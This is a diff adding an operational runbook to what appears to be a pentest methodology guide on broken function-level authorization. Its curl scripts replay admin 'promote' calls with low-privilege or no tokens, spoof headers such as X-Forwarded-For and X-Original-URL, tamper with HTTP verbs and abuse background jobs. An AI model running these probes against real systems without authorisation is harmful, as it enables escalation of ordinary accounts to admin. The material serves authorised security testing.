@@ -113,6 +113,99 @@ mutation Promote($id:ID!){
 
 - Cached authorization decisions at edge leading to cross-user reuse; test with Vary and session swaps
 
+## Operational Runbook
+
+BFLA is about *actions* (admin endpoints that low-priv users can reach), distinct from IDOR (per-record auth). The probe is: take a high-priv API call → strip auth or swap to low-priv → does the action still succeed?
+
+### Step 1 — capture admin calls
+
+Use a high-priv account to exercise admin features and capture every state-changing call:
+
+```bash
+# As ADMIN, hit /admin/users/123/promote (or whatever)
+ADMIN_TOKEN="<admin-bearer>"
+curl -s -X POST '<TARGET>/api/admin/users/123/promote' \
+    -H "Authorization: Bearer $ADMIN_TOKEN" \
+    -w '\n=== admin: %{http_code} ===\n'
+# Document the request — full URL, method, body, headers.
+```
+
+### Step 2 — replay as low-priv
+
+```bash
+LOW_TOKEN="<basic-user-bearer>"
+
+# Same call, basic user's token
+curl -s -X POST '<TARGET>/api/admin/users/123/promote' \
+    -H "Authorization: Bearer $LOW_TOKEN" \
+    -w '\n=== low-priv: %{http_code} ===\n'
+
+# If 2xx → BFLA. Low-priv user can promote others to admin.
+```
+
+### Step 3 — replay anonymous
+
+```bash
+# No auth at all — does the endpoint even check?
+curl -s -X POST '<TARGET>/api/admin/users/123/promote' \
+    -w '\n=== anon: %{http_code} ===\n'
+# 2xx anon → CWE-862 (missing auth entirely). Worse than BFLA.
+```
+
+### Step 4 — method-override + spoof headers
+
+```bash
+# Some gateways strip auth on non-listed methods or honor override headers
+curl -s -X POST '<TARGET>/api/admin/users/123/promote' \
+    -H "Authorization: Bearer $LOW_TOKEN" \
+    -H "X-HTTP-Method-Override: GET" \
+    -H "X-Original-URL: /api/admin/users/123/promote"
+
+# Try common spoofing headers
+for hdr in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" \
+           "X-Forwarded-Host: localhost" "Host: localhost" \
+           "X-Original-URL: /admin/promote" "X-Rewrite-URL: /admin/promote"; do
+  curl -s -X POST '<TARGET>/api/admin/users/123/promote' \
+       -H "Authorization: Bearer $LOW_TOKEN" \
+       -H "$hdr" -w "$hdr → %{http_code}\n"
+done
+```
+
+### Step 5 — verb-tamper authorization bypass
+
+```bash
+# Sometimes only POST is checked; PUT / PATCH / DELETE slip through
+for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
+  status=$(curl -s -o /dev/null -X $method '<TARGET>/api/admin/users/123' \
+           -H "Authorization: Bearer $LOW_TOKEN" -w '%{http_code}')
+  echo "$method → $status"
+done
+```
+
+### Step 6 — chained background-flow abuse
+
+Many BFLA bugs hide in async pipelines: low-priv submits a job → background worker doesn't re-check role:
+
+```bash
+# Submit a batch-promote as low-priv (job-creation often unauthenticated)
+JOB=$(curl -s -X POST '<TARGET>/api/jobs' \
+    -H "Authorization: Bearer $LOW_TOKEN" \
+    -d '{"type":"bulk_promote","payload":{"user_ids":[123]}}' | jq -r '.id')
+
+# Wait for the worker to pick up
+sleep 5
+curl -s "<TARGET>/api/users/123" -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.role'
+```
+
+### Step 7 — record evidence
+
+Document per (action, actor-role) cell:
+- HTTP method + URL + body
+- The role the action SHOULD require
+- The role the test actor had
+- Server response (2xx = bug)
+- Severity: **critical** when escalates a low-priv user to admin; **high** when it expands data access; **medium** when it grants non-security-sensitive admin features (e.g. analytics).
+
 ## Testing Methodology
 
 1. **Build Actor × Action matrix** - Unauth, basic, premium, staff/admin; enumerate actions per role
